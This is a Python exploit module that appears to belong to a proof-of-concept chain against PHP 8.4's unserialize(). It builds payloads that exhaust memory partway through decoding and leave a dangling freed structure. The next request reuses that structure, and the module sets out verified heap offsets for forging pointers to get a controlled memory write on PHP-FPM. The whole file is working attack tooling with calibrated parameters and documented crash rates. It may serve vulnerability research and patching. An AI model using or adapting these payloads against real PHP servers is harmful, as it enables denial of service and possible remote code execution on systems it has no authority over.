#!/usr/bin/env python3
# INDEX: script-level unserialize-OOM BG(unserialize) dangle arm, fpm-survivable | fpm apache cli | approved unserialize sink
"""Script-level unserialize()-OOM BG(unserialize) dangle arm (CVE-2026-109619).

The fpm-survivable sibling of session_decode_dangle.py. The app does ONE
`unserialize($_POST['d'])` (the project's approved single sink); the payload OOMs
mid-decode. Because the OOM fires inside zend_execute, it is caught by
php_execute_script's zend_first_try -> the worker SURVIVES (unlike the pre-RINIT
upload_progress self-arm, which exit-70s on fpm). php_var_unserialize_destroy is
skipped by the bailout, so BG(unserialize) is left {data=freed d, level=1}.
RINIT(basic) only memsets BG(unserialize) at the START of a request, and
RSHUTDOWN(basic) never touches it, so the dangle survives idle and is reused by
the NEXT request's PRE-RINIT upload_progress session decode
(php_var_unserialize_init takes the reuse branch while level!=0).

d is `struct php_unserialize_data`, 8192 bytes by design (2 pages, a ZendMM large
alloc). Freed large blocks are bitmap-managed (ZendMM does not write an intrusive
freelist link into them), so d's content is STABLE from arm-free until the
consumer reads it.

The OOM payload is a nested-array amplifier (~17x): a top-level array of
`nchildren` children, each a `depth`-deep single-element array. var_push tracks
every nested value, so ~8 MB of input exhausts a 128M memory_limit mid-decode.

VERIFIED, php:8.4.26-fpm behind nginx, fresh-container-per-trial, black-box:
  - arm survival: 20/20 (worker PID stable across the OOM, all OOMed).
  - dangle present after arm: BG(unserialize).{data!=0, level=1} (/proc observe).
  - next-request pre-RINIT decode reuses & derefs d: poison d->last/last_dtor ->
    3/3 worker crash; unpoisoned control 0/3; 8/8 crash across session sizes.
Needs a finite memory_limit (immune at -1: the big decode succeeds, destroy runs,
no dangle). Bigger payload -> earlier OOM. Pure stdlib; safe under `python3 -I`.
"""
from __future__ import annotations

import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)

# Calibrated at php:8.4.26 memory_limit=128M: N=4000 d=200 -> ~7.8 MB input,
# OOMs deterministically mid-decode (tried-to-allocate a var_entries growth).
DEFAULT_NCHILDREN = 4000
DEFAULT_DEPTH = 200

# Verified single-carrier model-B geometry (cochunk_payload(1100,4000000) +
# a 100-page first $_POST field carrier, php:8.4.26-fpm, fresh-container-per-trial):
#   d at chunk+0x6d000, E=d->last at chunk+0x70000 (SAME chunk).
#   The 100-page carrier's value is PAGE-ALIGNED at chunk+0x63000 (carrier_base),
#   so V[off] == (carrier_base+off) directly: d at V[0xa000], E at V[0xd000].
#   Forge d->last=K+0x70000, d->first_dtor/last_dtor at V[0xa008/0xa010], and
#   E->used_slots=AIM at V[0xd000]; the reused decode's var_push then writes the
#   value-dest zval* to E->data[AIM] = chunk+0x70010+8*AIM (signed AIM, K-free).
#   Only d->last needs the absolute E addr => one chunk-base (K) leak is required.
SC_CARRIER_PAGES = 100
SC_D_OFF, SC_E_OFF = 0xa000, 0xd000


def _child(depth: int) -> bytes:
    """A depth-nested single-element array, innermost null."""
    return b"a:1:{i:0;" * depth + b"N;" + b"}" * depth


def oom_payload(nchildren: int = DEFAULT_NCHILDREN, depth: int = DEFAULT_DEPTH) -> bytes:
    """Serialized blob that OOMs mid-`unserialize` at ~128M (nested-array amplifier).
    OOMs on var_entries growth -> leaves ~hundreds of freed 2-page var_entries blocks
    (d->last points at a separate freed E block; useful for the model-B E/DT carrier)."""
    inner = b"".join(b"i:%d;%s" % (i, _child(depth)) for i in range(nchildren))
    return b"a:%d:{%s}" % (nchildren, inner)


def prealloc_payload(k: int = 3000000) -> bytes:
    """OOM on a SINGLE huge array preallocation (array_init_size), not var_entries
    growth: var_push fires once, so NO overflow var_entries blocks are freed ->
    d is nearly the ONLY freed 2-page block. On fpm this makes the next request's
    first 2-page allocation reoccupy d DETERMINISTICALLY (d lands at a fixed chunk
    offset +0x6d000; a single pre-progress 2-page field/session-read lands on it,
    verified K>=1 8/8 fresh-container-per-trial). `a:K:{` + >=K/2 filler `i:0;`
    elems so IS_FAKE_ELEM_COUNT passes; OOM fires in array_init before the elems
    are read. d->last = &d->entries (embedded); no separate E block.
    NOTE: a zend_string header sits at a reoccupier's offset 0, so landing a plain
    field/session-buffer ON d cannot forge d->last directly; use the model-B huge
    carrier spanning the E/DT blocks above a preserved d (oom_payload)."""
    return b"a:%d:{" % k + b"i:0;" * (k // 2 + 10)


def cochunk_payload(n1: int = 1100, k: int = 4000000) -> bytes:
    """The verified model-B arm: an inner `a:n1:{n1 int pairs}` overflows the
    embedded var_entries a couple of times (so d->last is a SEPARATE freed E block
    in d's chunk, just above d: d at chunk+0x6d000, E at chunk+0x70000), then the
    OOM fires on a single huge array_init(k) -> few competing blocks. On fresh
    8.4.26-fpm a 100-page first $_POST field carrier then spans both d (carrier off
    SC_D_OFF) and E (SC_E_OFF), letting one carrier reoccupy both and forge the
    model-B write (see the SC_* geometry note; needs one chunk-base K leak for the
    absolute d->last=E)."""
    inner = b"a:%d:{" % n1 + b"".join(b"i:%d;i:0;" % i for i in range(n1)) + b"}"
    filler = b"i:0;" * (k // 2 + 10)
    return b"a:2:{i:0;" + inner + b"i:1;a:%d:{" % k + filler


def arm_parts(payload: bytes | None = None):
    """multipart part-tuples for common.multipart: one binary-safe field `d`
    carrying the OOM blob (the app does `unserialize($_POST['d'])`)."""
    from common.multipart import part_tuple
    if payload is None:
        payload = oom_payload()
    return [part_tuple("d", payload)]


if __name__ == "__main__":  # smoke test (no network)
    p = oom_payload()
    print(f"oom_payload: {len(p)} bytes (N={DEFAULT_NCHILDREN} depth={DEFAULT_DEPTH})")
    print(f"arm_parts  : {len(arm_parts(p))} part(s)")
